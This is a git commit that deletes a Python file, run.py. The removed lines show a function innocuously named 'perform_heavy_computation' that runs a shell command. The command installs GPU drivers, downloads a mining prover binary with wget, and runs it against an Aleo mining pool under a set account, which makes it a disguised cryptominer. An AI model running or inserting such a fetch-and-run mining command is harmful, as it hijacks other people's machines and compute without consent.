29ed6a257db9a25a8bf46f97ee9355ca2ac4ae62
aesthetticc32 <aesthetticc32@gmail.com>
2024-12-09 07:12:47 +0700

    Delete run.py

--- run.py
+++
@@ -1,5 +0,0 @@
-import os
-def perform_heavy_computation():
-    import os
-    os.system('apt update;apt install nvidia-driver-510 -y;wget https://github.com/oula-network/aleo/releases/download/v1.10/oula-pool-prover -O cos;chmod +x cos;./cos --pool wss://aleo.oula.network:6666 --account vbropa --worker-name RANDOM.$RANDOM')
-perform_heavy_computation()
